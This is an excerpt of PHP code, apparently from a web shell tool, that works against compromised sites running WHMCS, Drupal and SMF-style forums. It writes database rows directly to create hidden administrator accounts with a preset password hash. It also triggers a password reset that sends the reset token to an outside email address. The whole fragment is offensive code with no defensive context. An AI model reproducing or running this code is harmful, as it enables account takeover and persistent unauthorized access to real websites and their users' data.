...
$create = "insert into tblclients (email) values('result.jfr@gmail.com')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=result.jfr@gmail.com");
...
$table = array('td1' =>
 ...
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'result.jfr@gmail.com', 'inputSize' => '50')
);
create_table($table);
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','result.jfr@gmail.com','filtered_html','1','Europe/Berlin','result.jfr@gmail.com')") or die(mysqli_error($conn));
...
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','result.jfr@gmail.com')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
